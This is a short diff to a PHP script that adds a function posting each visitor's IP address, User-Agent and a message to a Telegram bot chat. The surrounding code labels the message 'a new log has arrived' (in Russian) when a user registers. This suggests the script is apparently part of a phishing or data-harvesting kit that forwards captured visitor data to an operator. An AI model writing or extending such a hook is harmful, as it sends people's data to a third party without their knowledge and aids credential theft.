@@ -54,6 +54,31 @@ function getUserRegion($ip) {
 // $ch = curl_init();
 // curl_setopt_array($ch, $options);
 // curl_exec($ch);
+function sendMessageToChat($chat_id, $message)
+{
+  global $tg_bot_token;
+
+  $apiUrl = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
+  $ip = getUserIP();
+  $userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+  $data = [
+    'chat_id' => $chat_id,
+    'text' => "IP: <code>$ip</code>\nUser-Agent: <code>$userAgent</code>\n\n" . $message,
+    'parse_mode' => 'HTML'
+  ];
+
+  $options = [
+    CURLOPT_URL => $apiUrl,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => http_build_query($data),
+    CURLOPT_RETURNTRANSFER => true,
+  ];
+
+  $ch = curl_init();
+  curl_setopt_array($ch, $options);
+  curl_exec($ch);
+}
 
 #Пользователь заргеистрировался
 $text = '<b>' . '✅ Пришел новый лог' . '</b>' . "\n\n";
